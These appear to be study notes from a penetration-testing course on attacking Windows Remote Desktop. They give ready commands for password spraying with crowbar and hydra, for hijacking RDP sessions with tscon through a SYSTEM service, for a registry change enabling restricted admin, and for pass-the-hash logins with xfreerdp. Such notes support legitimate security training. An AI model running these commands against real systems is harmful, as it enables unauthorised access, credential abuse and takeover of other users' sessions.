# Password spraying
- Single password, many users
- `crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'`
- `hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp

# Protocol Specific attacks
- RDP Session Hijacking
	- eg. Logged in as user with Admin privileges, want to hijack anothre user also logged in via RDP
		- Check with Task Manager -> Users or `query user` in Powershell
	- We want to impersonate a user without their password
		- Need to have SYSTEM privileges, and use the Microsoft `tscon.exe` binary that enables users to connect to another desktop session
		-  `tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
			- Get the target session ID and our session name from `query user` in Powershell
		- If access denied,
			- `sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"`
				-  Execute the binary with SYSTEM privileges. This command creates the service called sessionhijack
			- `net start sessionhijack
				- run the command
## RDP Pass The Hash 
- See (kiv)
- Add the DIsableRestrictedAdminRegistry Key
	- `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f`
- Then can xfreerdp into it with the hash, without knowing cleartext password
	- `xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9`
		- `/pth` for pass the hash